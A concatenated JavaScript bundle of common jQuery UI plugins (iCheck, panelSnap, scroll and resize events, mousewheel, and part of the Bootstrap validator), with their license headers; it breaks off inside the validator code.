/*!
 * iCheck v1.0.1, http://git.io/arlzeA
 * ===================================
 * Powerful jQuery and Zepto plugin for checkboxes and radio buttons customization
 *
 * (c) 2013 Damir Sultanov, http://fronteed.com
 * MIT Licensed
 */

(function($) {

  // Cached vars
  var _iCheck = 'iCheck',
    _iCheckHelper = _iCheck + '-helper',
    _checkbox = 'checkbox',
    _radio = 'radio',
    _checked = 'checked',
    _unchecked = 'un' + _checked,
     _disabled = 'disabled',
    _determinate = 'determinate',
    _indeterminate = 'in' + _determinate,
    _update = 'update',
    _type = 'type',
    _click = 'click',
    _touch = 'touchbegin.i touchend.i',
    _add = 'addClass',
    _remove = 'removeClass',
    _callback = 'trigger',
    _label = 'label',
    _cursor = 'cursor',
    _mobile = /ipad|iphone|ipod|android|blackberry|windows phone|opera mini|silk/i.test(navigator.userAgent);

  // Plugin init
  $.fn[_iCheck] = function(options, fire) {

    // Walker
    var handle = 'input[type="' + _checkbox + '"], input[type="' + _radio + '"]',
      stack = $(),
      walker = function(object) {
        object.each(function() {
          var self = $(this);

          if (self.is(handle)) {
            stack = stack.add(self);
          } else {
            stack = stack.add(self.find(handle));
          };
        });
      };

    // Check if we should operate with some method
    if (/^(check|uncheck|toggle|indeterminate|determinate|disable|enable|update|destroy)$/i.test(options)) {

      // Normalize method's name
      options = options.toLowerCase();

      // Find checkboxes and radio buttons
      walker(this);

      return stack.each(function() {
        var self = $(this);

        if (options == 'destroy') {
          tidy(self, 'ifDestroyed');
        } else {
          operate(self, true, options);
        };

        // Fire method's callback
        if ($.isFunction(fire)) {
          fire();
        };
      });

    // Customization
    } else if (typeof options == 'object' || !options) {

      // Check if any options were passed
      var settings = $.extend({
          checkedClass: _checked,
          disabledClass: _disabled,
          indeterminateClass: _indeterminate,
          labelHover: true,
          aria: false
        }, options),

        selector = settings.handle,
        hoverClass = settings.hoverClass || 'hover',
        focusClass = settings.focusClass || 'focus',
        activeClass = settings.activeClass || 'active',
        labelHover = !!settings.labelHover,
        labelHoverClass = settings.labelHoverClass || 'hover',

        // Setup clickable area
        area = ('' + settings.increaseArea).replace('%', '') | 0;

      // Selector limit
      if (selector == _checkbox || selector == _radio) {
        handle = 'input[type="' + selector + '"]';
      };

      // Clickable area limit
      if (area < -50) {
        area = -50;
      };

      // Walk around the selector
      walker(this);

      return stack.each(function() {
        var self = $(this);

        // If already customized
        tidy(self);

        var node = this,
          id = node.id,

          // Layer styles
          offset = -area + '%',
          size = 100 + (area * 2) + '%',
          layer = {
            position: 'absolute',
            top: offset,
            left: offset,
            display: 'block',
            width: size,
            height: size,
            margin: 0,
            padding: 0,
            background: '#fff',
            border: 0,
            opacity: 0
          },

          // Choose how to hide input
          hide = _mobile ? {
            position: 'absolute',
            visibility: 'hidden'
          } : area ? layer : {
            position: 'absolute',
            opacity: 0
          },

          // Get proper class
          className = node[_type] == _checkbox ? settings.checkboxClass || 'i' + _checkbox : settings.radioClass || 'i' + _radio,

          // Find assigned labels
          label = $(_label + '[for="' + id + '"]').add(self.closest(_label)),

          // Check ARIA option
          aria = !!settings.aria,

          // Set ARIA placeholder
          ariaID = _iCheck + '-' + Math.random().toString(36).substr(2,6),

          // Parent & helper
          parent = '<div class="' + className + '" ' + (aria ? 'role="' + node[_type] + '" ' : ''),
          helper;

        // Set ARIA "labelledby"
        if (aria) {
          label.each(function() {
            parent += 'aria-labelledby="';

            if (this.id) {
              parent += this.id;
            } else {
              this.id = ariaID;
              parent += ariaID;
            }

            parent += '"';
          });
        };

        // Wrap input
        parent = self.wrap(parent + '/>')[_callback]('ifCreated').parent().append(settings.insert);

        // Layer addition
        helper = $('<ins class="' + _iCheckHelper + '"/>').css(layer).appendTo(parent);

        // Finalize customization
        self.data(_iCheck, {o: settings, s: self.attr('style')}).css(hide);
        !!settings.inheritClass && parent[_add](node.className || '');
        !!settings.inheritID && id && parent.attr('id', _iCheck + '-' + id);
        parent.css('position') == 'static' && parent.css('position', 'relative');
        operate(self, true, _update);

        // Label events
        if (label.length) {
          label.on(_click + '.i mouseover.i mouseout.i ' + _touch, function(event) {
            var type = event[_type],
              item = $(this);

            // Do nothing if input is disabled
            if (!node[_disabled]) {

              // Click
              if (type == _click) {
                if ($(event.target).is('a')) {
                  return;
                }
                operate(self, false, true);

              // Hover state
              } else if (labelHover) {

                // mouseout|touchend
                if (/ut|nd/.test(type)) {
                  parent[_remove](hoverClass);
                  item[_remove](labelHoverClass);
                } else {
                  parent[_add](hoverClass);
                  item[_add](labelHoverClass);
                };
              };

              if (_mobile) {
                event.stopPropagation();
              } else {
                return false;
              };
            };
          });
        };

        // Input events
        self.on(_click + '.i focus.i blur.i keyup.i keydown.i keypress.i', function(event) {
          var type = event[_type],
            key = event.keyCode;

          // Click
          if (type == _click) {
            return false;

          // Keydown
          } else if (type == 'keydown' && key == 32) {
            if (!(node[_type] == _radio && node[_checked])) {
              if (node[_checked]) {
                off(self, _checked);
              } else {
                on(self, _checked);
              };
            };

            return false;

          // Keyup
          } else if (type == 'keyup' && node[_type] == _radio) {
            !node[_checked] && on(self, _checked);

          // Focus/blur
          } else if (/us|ur/.test(type)) {
            parent[type == 'blur' ? _remove : _add](focusClass);
          };
        });

        // Helper events
        helper.on(_click + ' mousedown mouseup mouseover mouseout ' + _touch, function(event) {
          var type = event[_type],

            // mousedown|mouseup
            toggle = /wn|up/.test(type) ? activeClass : hoverClass;

          // Do nothing if input is disabled
          if (!node[_disabled]) {

            // Click
            if (type == _click) {
              operate(self, false, true);

            // Active and hover states
            } else {

              // State is on
              if (/wn|er|in/.test(type)) {

                // mousedown|mouseover|touchbegin
                parent[_add](toggle);

              // State is off
              } else {
                parent[_remove](toggle + ' ' + activeClass);
              };

              // Label hover
              if (label.length && labelHover && toggle == hoverClass) {

                // mouseout|touchend
                label[/ut|nd/.test(type) ? _remove : _add](labelHoverClass);
              };
            };

            if (_mobile) {
              event.stopPropagation();
            } else {
              return false;
            };
          };
        });
      });
    } else {
      return this;
    };
  };

  // Do something with inputs
  function operate(input, direct, method) {
    var node = input[0],
      state = /er/.test(method) ? _indeterminate : /bl/.test(method) ? _disabled : _checked,
      active = method == _update ? {
        checked: node[_checked],
        disabled: node[_disabled],
        indeterminate: input.attr(_indeterminate) == 'true' || input.attr(_determinate) == 'false'
      } : node[state];

    // Check, disable or indeterminate
    if (/^(ch|di|in)/.test(method) && !active) {
      on(input, state);

    // Uncheck, enable or determinate
    } else if (/^(un|en|de)/.test(method) && active) {
      off(input, state);

    // Update
    } else if (method == _update) {

      // Handle states
      for (var state in active) {
        if (active[state]) {
          on(input, state, true);
        } else {
          off(input, state, true);
        };
      };

    } else if (!direct || method == 'toggle') {

      // Helper or label was clicked
      if (!direct) {
        input[_callback]('ifClicked');
      };

      // Toggle checked state
      if (active) {
        if (node[_type] !== _radio) {
          off(input, state);
        };
      } else {
        on(input, state);
      };
    };
  };

  // Add checked, disabled or indeterminate state
  function on(input, state, keep) {
    var node = input[0],
      parent = input.parent(),
      checked = state == _checked,
      indeterminate = state == _indeterminate,
      disabled = state == _disabled,
      callback = indeterminate ? _determinate : checked ? _unchecked : 'enabled',
      regular = option(input, callback + capitalize(node[_type])),
      specific = option(input, state + capitalize(node[_type]));

    // Prevent unnecessary actions
    if (node[state] !== true) {

      // Toggle assigned radio buttons
      if (!keep && state == _checked && node[_type] == _radio && node.name) {
        var form = input.closest('form'),
          inputs = 'input[name="' + node.name + '"]';

        inputs = form.length ? form.find(inputs) : $(inputs);

        inputs.each(function() {
          if (this !== node && $(this).data(_iCheck)) {
            off($(this), state);
          };
        });
      };

      // Indeterminate state
      if (indeterminate) {

        // Add indeterminate state
        node[state] = true;

        // Remove checked state
        if (node[_checked]) {
          off(input, _checked, 'force');
        };

      // Checked or disabled state
      } else {

        // Add checked or disabled state
        if (!keep) {
          node[state] = true;
        };

        // Remove indeterminate state
        if (checked && node[_indeterminate]) {
          off(input, _indeterminate, false);
        };
      };

      // Trigger callbacks
      callbacks(input, checked, state, keep);
    };

    // Add proper cursor
    if (node[_disabled] && !!option(input, _cursor, true)) {
      parent.find('.' + _iCheckHelper).css(_cursor, 'default');
    };

    // Add state class
    parent[_add](specific || option(input, state) || '');

    // Set ARIA attribute
    disabled ? parent.attr('aria-disabled', 'true') : parent.attr('aria-checked', indeterminate ? 'mixed' : 'true');

    // Remove regular state class
    parent[_remove](regular || option(input, callback) || '');
  };

  // Remove checked, disabled or indeterminate state
  function off(input, state, keep) {
    var node = input[0],
      parent = input.parent(),
      checked = state == _checked,
      indeterminate = state == _indeterminate,
      disabled = state == _disabled,
      callback = indeterminate ? _determinate : checked ? _unchecked : 'enabled',
      regular = option(input, callback + capitalize(node[_type])),
      specific = option(input, state + capitalize(node[_type]));

    // Prevent unnecessary actions
    if (node[state] !== false) {

      // Toggle state
      if (indeterminate || !keep || keep == 'force') {
        node[state] = false;
      };

      // Trigger callbacks
      callbacks(input, checked, callback, keep);
    };

    // Add proper cursor
    if (!node[_disabled] && !!option(input, _cursor, true)) {
      parent.find('.' + _iCheckHelper).css(_cursor, 'pointer');
    };

    // Remove state class
    parent[_remove](specific || option(input, state) || '');

    // Set ARIA attribute
    disabled ? parent.attr('aria-disabled', 'false') : parent.attr('aria-checked', 'false');

    // Add regular state class
    parent[_add](regular || option(input, callback) || '');
  };

  // Remove all traces
  function tidy(input, callback) {
    if (input.data(_iCheck)) {

      // Remove everything except input
      input.parent().html(input.attr('style', input.data(_iCheck).s || ''));

      // Callback
      if (callback) {
        input[_callback](callback);
      };

      // Unbind events
      input.off('.i').unwrap();
      $(_label + '[for="' + input[0].id + '"]').add(input.closest(_label)).off('.i');
    };
  };

  // Get some option
  function option(input, state, regular) {
    if (input.data(_iCheck)) {
      return input.data(_iCheck).o[state + (regular ? '' : 'Class')];
    };
  };

  // Capitalize some string
  function capitalize(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
  };

  // Executable handlers
  function callbacks(input, checked, callback, keep) {
    if (!keep) {
      if (checked) {
        input[_callback]('ifToggled');
      };

      input[_callback]('ifChanged')[_callback]('if' + capitalize(callback));
    };
  };
})(window.jQuery || window.Zepto);


// Utility for creating objects in older browsers
if ( typeof Object.create !== 'function' ) {

  Object.create = function( obj ) {

    function F() {}
    F.prototype = obj;
    return new F();

  };

}

/*!
 * jQuery panelSnap
 * Version 0.9.2
 *
 * Requires:
 * - jQuery 1.7.1 or higher (no jQuery.migrate needed)
 *
 * https://github.com/guidobouman/jquery-panelsnap
 *
 * Copyright 2013, Guido Bouman
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * Date: Wed Feb 13 16:05:00 2013 +0100
 */
(function($, window, document, undefined) {

  var pluginName = 'panelSnap';
  var storageName = 'plugin_' + pluginName;

  var pluginObject = {
    isMouseDown: false,
    isSnapping: false,
    scrollInterval: 0,
    scrollOffset: 0,

    init: function(options, container) {

      var self = this;

      self.$window = $(window);
      self.$document = $(document);

      self.container = container;
      self.$container = $(container);

      self.$eventContainer = self.$container;
      self.$snapContainer = self.$container;

      if(self.$container.is('body')) {

        self.$eventContainer = self.$document;
        var ua = navigator.userAgent;

        if(!~ua.indexOf("WebKit")) {

          self.$snapContainer = $('html');

        }

      }

      self.scrollInterval = self.$container.height();

      self.options = $.extend(true, {}, $.fn.panelSnap.options, options);

      self.bind();

      if(self.options.$menu !== false && $('.active', self.options.$menu).length > 0) {

        $('.active', self.options.$menu).click();

      } else {

        var $target = self.getPanel(':first');
        self.activatePanel($target);

      }

      return self;

    },

    bind: function() {

      var self = this;

      self.bindProxied(self.$eventContainer, 'scrollstop', self.scrollStop);
      self.bindProxied(self.$eventContainer, 'mousewheel', self.mouseWheel);
      self.bindProxied(self.$eventContainer, 'mousedown', self.mouseDown);
      self.bindProxied(self.$eventContainer, 'mouseup', self.mouseUp);

      self.bindProxied(self.$window, 'resizestop', self.resize);

      if(self.options.$menu !== false) {

        self.bindProxied($(self.options.$menu), 'click', self.captureMenuClick, self.options.menuSelector);

      }

    },

    bindProxied: function($element, event, method, selector) {

      var self = this;

      selector = typeof selector === 'string' ? selector : null;

      $element.on(event + self.options.namespace, selector, $.proxy(function(e) {

        return method.call(self, e);

      }, self));

    },

    destroy: function() {

      var self = this;

      // Gotta love namespaced events!
      self.$eventContainer.off(self.options.namespace);

      self.$window.off(self.options.namespace);

      if(self.options.$menu !== false) {

        $(self.options.menuSelector, self.options.$menu).off(self.options.namespace);

      }

      self.$container.removeData(storageName);

    },

    scrollStop: function(e) {

      var self = this;

      e.stopPropagation();

      if(self.isMouseDown) {

        self.$eventContainer.one('mouseup' + self.options.namespace, self.processScroll);
        return;

      }

      if(self.isSnapping) {

        return;

      }

      var offset = self.$eventContainer.scrollTop();
      var scrollDifference = offset - self.scrollOffset;
      var maxOffset = self.$container[0].scrollHeight - self.scrollInterval;
      var panelCount = self.getPanel().length;

      var child_number;
      if(scrollDifference < -self.options.directionThreshold &&
        scrollDifference > -self.scrollInterval) {

        child_number = Math.floor(offset / self.scrollInterval);

      } else if(scrollDifference > self.options.directionThreshold &&
        scrollDifference < self.scrollInterval) {

        child_number = Math.ceil(offset / self.scrollInterval);

      } else {

        child_number = Math.round(offset / self.scrollInterval);

      }

      child_number = Math.max(0, Math.min(child_number, panelCount));

      var $target = self.getPanel(':eq(' + child_number + ')');

      if((scrollDifference === 0) ||
        (scrollDifference < 100 && (offset < 0 || offset > maxOffset))) {

        self.activatePanel($target);

      } else {

        self.snapToPanel($target);

      }

    },

    mouseWheel: function(e) {

      var self = this;

      // This event only fires when the user actually scrolls with their input device.
      // Be it a trackpad, legacy mouse or anything else.

      self.$container.stop(true);
      self.isSnapping = false;

    },

    mouseDown: function(e) {

      var self = this;

      self.isMouseDown = true;

    },

    mouseUp: function(e) {

      var self = this;

      self.isMouseDown = false;

    },

    resize: function(e) {

      var self = this;

      self.scrollInterval = self.$container.height();

      var $target = self.getPanel('.active');

      self.snapToPanel($target);

    },

    captureMenuClick: function(e) {

      var self = this;

      var panel = $(e.currentTarget).data('panel');
      var $target = self.getPanel('[data-panel=' + panel + ']');

      self.snapToPanel($target);

      return false;

    },

    snapToPanel: function($target) {

      var self = this;

      self.isSnapping = true;

      self.options.onSnapStart.call(self, $target);
      self.$container.trigger('panelsnap:start', [$target]);

      var scrollTarget = 0;
      if(self.$container.is('body')) {

        scrollTarget = $target.offset().top;

      } else {

        scrollTarget = self.$eventContainer.scrollTop() + $target.position().top;

      }

      self.$snapContainer.stop(true).animate({
        scrollTop: scrollTarget
      }, self.options.slideSpeed, function() {

        self.scrollOffset = scrollTarget;
        self.isSnapping = false;

        // Call callback
        self.options.onSnapFinish.call(self, $target);
        self.$container.trigger('panelsnap:finish', [$target]);

      });

      self.activatePanel($target);

    },

    activatePanel: function($target) {

      var self = this;

      $('> ' + self.options.panelSelector + '.active', self.container).removeClass('active');
      $target.addClass('active');

      if(self.options.$menu !== false) {

        $(self.options.menuSelector + '.active', self.options.$menu).removeClass('active');

        var itemSelector = self.options.menuSelector + '[data-panel=' + $target.data('panel') + ']';
        var $activeItem = $(itemSelector, self.options.$menu);
        $activeItem.addClass('active');

      }

    },

    getPanel: function(selector) {

      var self = this;

      if(typeof selector === 'undefined') {

        selector = '';

      }

      var panel_selector = '> ' + self.options.panelSelector + selector;
      return $(panel_selector, self.$container);

    },

    snapTo: function(target, wrap) {

      var self = this;

      if(typeof wrap !== 'boolean') {

        wrap = true;

      }

      var $target;

      switch(target) {

        case 'prev':

          $target = self.getPanel('.active').prev(self.options.panelSelector);
          if($target.length < 1 && wrap)
          {
            $target = self.getPanel(':last');
          }
          break;

        case 'next':

          $target = self.getPanel('.active').next(self.options.panelSelector);
          if($target.length < 1 && wrap)
          {
            $target = self.getPanel(':first');
          }
          break;

        case 'first':

          $target = self.getPanel(':first');
          break;

        case 'last':

          $target = self.getPanel(':last');
          break;

      }

      if($target.length > 0) {

        self.snapToPanel($target);

      }

    }
  };

  $.fn[pluginName] = function(options) {
    var args = Array.prototype.slice.call(arguments);

    return this.each(function() {

      var pluginInstance = $.data(this, storageName);
      if(typeof options === 'object' || options === 'init' || ! options) {

        if(!pluginInstance) {

          if(options === 'init') {

            options = args[1] || {};

          }

          pluginInstance = Object.create(pluginObject).init(options, this);
          $.data(this, storageName, pluginInstance);

        } else {

          $.error('Plugin is already initialized for this object.');
          return;

        }

      } else if(!pluginInstance) {

        $.error('Plugin is not initialized for this object yet.');
        return;

      } else if(pluginInstance[options]) {

        var method = options;
        options = args.slice(1);
        pluginInstance[method].apply(pluginInstance, options);

      } else {

        $.error('Method ' +  options + ' does not exist on jQuery.panelSnap.');
        return;

      }

    });
  };

  $.fn.panelSnap.options = {
    $menu: false,
    menuSelector: 'a',
    panelSelector: 'section',
    namespace: '.panelSnap',
    onSnapStart: function(){},
    onSnapFinish: function(){},
    directionThreshold: 50,
    slideSpeed: 200
  };

})(jQuery, window, document);

/*!
 * Special flavoured jQuery Mobile scrollstart & scrollstop events.
 * Version 0.1.3
 *
 * Requires:
 * - jQuery 1.7.1 or higher (no jQuery.migrate needed)
 *
 * Copyright 2013, Guido Bouman
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * Date: Wed Feb 13 16:05:00 2013 +0100
 */
(function($) {

  // Also handles the scrollstop event
  $.event.special.scrollstart = {

    enabled: true,

    setup: function() {

      var thisObject = this;
      var $this = $(thisObject);
      var scrolling;
      var timer;

      $this.data('scrollwatch', true);

      function trigger(event, scrolling) {

        event.type = scrolling ? "scrollstart" : "scrollstop";
        $this.trigger(event);

      }

      $this.on("touchmove scroll", function(event) {

        if(!$.event.special.scrollstart.enabled) {
          return;
        }

        if(!$.event.special.scrollstart.scrolling) {
          $.event.special.scrollstart.scrolling = true;
          trigger(event, true);
        }

        clearTimeout(timer);
        timer = setTimeout(function() {
          $.event.special.scrollstart.scrolling = false;
          trigger(event, false);
        }, 50);

      });
    }
  };

  // Proxies scrollstart when needed
  $.event.special.scrollstop = {

    setup: function() {

      var thisObject = this;
      var $this = $(thisObject);

      if(!$this.data('scrollwatch')) {
        $(this).on('scrollstart', function(){});
      }

    }
  };

})(jQuery);

/*!
 * Resizestart and resizestop events.
 * Version 0.0.1
 *
 * Requires:
 * - jQuery 1.7.1 or higher (no jQuery.migrate needed)
 *
 * Copyright 2013, Guido Bouman
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * Date: Fri Oct 25 15:05:00 2013 +0100
 */
(function($) {

  // Also handles the resizestop event
  $.event.special.resizestart = {

    enabled: true,

    setup: function() {

      var thisObject = this;
      var $this = $(thisObject);
      var resizing;
      var timer;

      $this.data('resizewatch', true);

      function trigger(event, resizing) {

        event.type = resizing ? "resizestart" : "resizestop";
        $this.trigger(event);

      }

      $this.on("resize", function(event) {

        if(!$.event.special.resizestart.enabled) {
          return;
        }

        if(!$.event.special.resizestart.resizing) {
          $.event.special.resizestart.resizing = true;
          trigger(event, true);
        }

        clearTimeout(timer);
        timer = setTimeout(function() {
          $.event.special.resizestart.resizing = false;
          trigger(event, false);
        }, 200);

      });
    }
  };

  // Proxies resizestart when needed
  $.event.special.resizestop = {

    setup: function() {

      var thisObject = this;
      var $this = $(thisObject);

      if(!$this.data('resizewatch')) {
        $(this).on('resizestart', function(){});
      }

    }
  };

})(jQuery);

/*! Copyright (c) 2011 Brandon Aaron (http://brandonaaron.net)
 * Licensed under the MIT License (LICENSE.txt).
 *
 * Thanks to: http://adomas.org/javascript-mouse-wheel/ for some pointers.
 * Thanks to: Mathias Bank(http://www.mathias-bank.de) for a scope bug fix.
 * Thanks to: Seamus Leahy for adding deltaX and deltaY
 *
 * Version: 3.0.6
 *
 * Requires: 1.2.2+
 */
(function($) {

  var types = ['DOMMouseScroll', 'mousewheel'];

  if ($.event.fixHooks) {
    for ( var i=types.length; i; ) {
      $.event.fixHooks[ types[--i] ] = $.event.mouseHooks;
    }
  }

  $.event.special.mousewheel = {
    setup: function() {
      if ( this.addEventListener ) {
        for ( var i=types.length; i; ) {
          this.addEventListener( types[--i], handler, false );
        }
      } else {
        this.onmousewheel = handler;
      }
    },

    teardown: function() {
      if ( this.removeEventListener ) {
        for ( var i=types.length; i; ) {
          this.removeEventListener( types[--i], handler, false );
        }
      } else {
        this.onmousewheel = null;
      }
    }
  };

  $.fn.extend({
    mousewheel: function(fn) {
      return fn ? this.bind("mousewheel", fn) : this.trigger("mousewheel");
    },

    unmousewheel: function(fn) {
      return this.unbind("mousewheel", fn);
    }
  });

  function handler(event) {
    var orgEvent = event || window.event,
        args = [].slice.call( arguments, 1 ),
        delta = 0,
        returnValue = true,
        deltaX = 0,
        deltaY = 0;

    event = $.event.fix(orgEvent);
    event.type = "mousewheel";

    // Old school scrollwheel delta
    if ( orgEvent.wheelDelta ) { delta = orgEvent.wheelDelta/120; }
    if ( orgEvent.detail     ) { delta = -orgEvent.detail/3; }

    // New school multidimensional scroll (touchpads) deltas
    deltaY = delta;

    // Gecko
    if ( orgEvent.axis !== undefined && orgEvent.axis === orgEvent.HORIZONTAL_AXIS ) {
      deltaY = 0;
      deltaX = -1*delta;
    }

    // Webkit
    if ( orgEvent.wheelDeltaY !== undefined ) { deltaY = orgEvent.wheelDeltaY/120; }
    if ( orgEvent.wheelDeltaX !== undefined ) { deltaX = -1*orgEvent.wheelDeltaX/120; }

    // Add event and delta to the front of the arguments
    args.unshift(event, delta, deltaX, deltaY);

    return ($.event.dispatch || $.event.handle).apply(this, args);
  }

})(jQuery);

/* ========================================================================
 * Bootstrap (plugin): validator.js v0.3.0
 * ========================================================================
 * The MIT License (MIT)
 *
 * Copyright (c) 2013 Spiceworks, Inc.
 * Made by Cina Saffary (@1000hz) in the style of Bootstrap 3 era @fat
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 * ======================================================================== */


+function ($) {
  'use strict';

  // VALIDATOR CLASS DEFINITION
  // ==========================

  var Validator = function (element, options) {
    this.$element = $(element)
    this.options  = options

    this.toggleSubmit()

    this.$element.on('input.bs.validator change.bs.validator focusout.bs.validator', $.proxy(this.validateInput, this))

    this.$element.find('[data-match]').each(function () {
      var $this  = $(this)
      var target = $this.data('match')

      $(target).on('input.bs.validator', function (e) {
        $this.val() && $this.trigger('input')
      })
    })
  }

  Validator.DEFAULTS = {
    delay: 300,
    errors: {
      match: 'Does not match',
      minlength: 'Not long enough'
    }
  }

  Validator.VALIDATORS = {
    native: function ($el) {
      var el = $el[0]
      return el.checkValidity ? el.checkValidity() : true
    },
    match: function ($el) {
      var target = $el.data('match')
      return !$el.val() || $el.val() === $(target).val()
    },
    minlength: function ($el) {
      var minlength = $el.data('minlength')
      return !$el.val() || $el.val().length >= minlength
    }
  }

  Validator.prototype.validateInput = function (e) {
    var $el        = $(e.target)
    var prevErrors = $el.data('bs.validator.errors')
    var errors

    this.$element.trigger(e = $.Event('validate.bs.validator', {relatedTarget: $el[0]}))

    if (e.isDefaultPrevented()) return

    $el.data('bs.validator.errors', errors = this.runValidators($el))

    errors.length ? this.showErrors($el) : this.clearErrors($el)

    if (!prevErrors || errors.toString() !== prevErrors.toString()) {
      e = errors.length
        ? $.Event('invalid.bs.validator', {relatedTarget: $el[0], detail: errors})
        : $.Event('valid.bs.validator', {relatedTarget: $el[0], detail: prevErrors})

      this.$element.trigger(e)
    }

    this.toggleSubmit()

    this.$element.trigger($.Event('validated.bs.validator', {relatedTarget: $el[0]}))
  }

  Validator.prototype.runValidators = function ($el) {
    var errors     = []
    var validators = [Validator.VALIDATORS.native]

    $.each(Validator.VALIDATORS, $.proxy(function (key, validator) {
      if (($el.data(key) || key == 'native') && !validator.call(this, $el)) {
        var error = $el.data(key + '-error')
          || $el.data('error')
          || key == 'native' && $el[0].validationMessage
          || this.options.errors[key]

        !~errors.indexOf(error) && errors.push(error)
      }
    }, this))

    return errors
  }

  Validator.prototype.validate = function () {
    var delay = this.options.delay

    this.options.delay = 0
    this.$element.find(':input').trigger('input')
    this.options.delay = delay

    return this
  }

  Validator.prototype.showErrors = function ($el) {
    function callback() {
      var $group = $el.closest('.form-group')
      var $block = $group.find('.help-block.with-errors')
      var errors = $el.data('bs.validator.errors')

      if (!errors.length) return

      errors = $('<ul/>')
        .addClass('list-unstyled')
        .append($.map(errors, function (error) { return $('<li/>').text(error) }))

      $block.data('bs.validator.originalContent') === undefined && $block.data('bs.validator.originalContent', $block.html())
      $block.empty().append(errors)

      $group.addClass('has-error')
    }

    if (this.options.delay) {
      window.clearTimeout($el.data('bs.validator.timeout'))
      $el.data('bs.timeout', window.setTimeout(callback, this.options.delay))
    } else callback()
  }

  Validator.prototype.clearErrors = function ($el) {
    var $group = $el.closest('.form-group')
    var $block = $group.find('.help-block.with-errors')

    $block.html($block.data('bs.validator.originalContent'))
    $group.removeClass('has-error')
  }

  Validator.prototype.hasErrors = function () {
    function fieldErrors() {
      return !!($(this).data('bs.validator.errors') || []).length
    }

    return !!this.$element.find(':input:enabled').filter(fieldErrors).length
  }

  Validator.prototype.isIncomplete = function () {
    function fieldIncomplete() {
      return this.type === 'checkbox' ? !this.checked                                   :
             this.type === 'radio'    ? !$('[name="' + this.name + '"]:checked').length :
                                        $.trim(this.value) === ''
    }

    return !!this.$element.find(':input[required]:enabled').filter(fieldIncomplete).length
  }

  Validator.prototype.toggleSubmit = function () {
    var $btn = this.$element.find('input[type="submit"], button[type="submit"]')
    $btn.attr('disabled', this.isIncomplete() || this.hasErrors())
  }


  // VALIDATOR PLUGIN DEFINITION
  // ===========================

  var old = $.fn.validator

  $.fn.validator = function (option) {
    return this.each(function () {
      var $this   = $(this)
      var options = $.extend({}, Validator.DEFAULTS, $this.data(), typeof option == 'object' && option)
      var data    = $this.data('bs.validator')

      if (!data) $this.data('bs.validator', (data = new Validator(this, options)))
      if (typeof option == 'string') data[option]()
    })
  }

  $.fn.validator.Constructor = Validator;


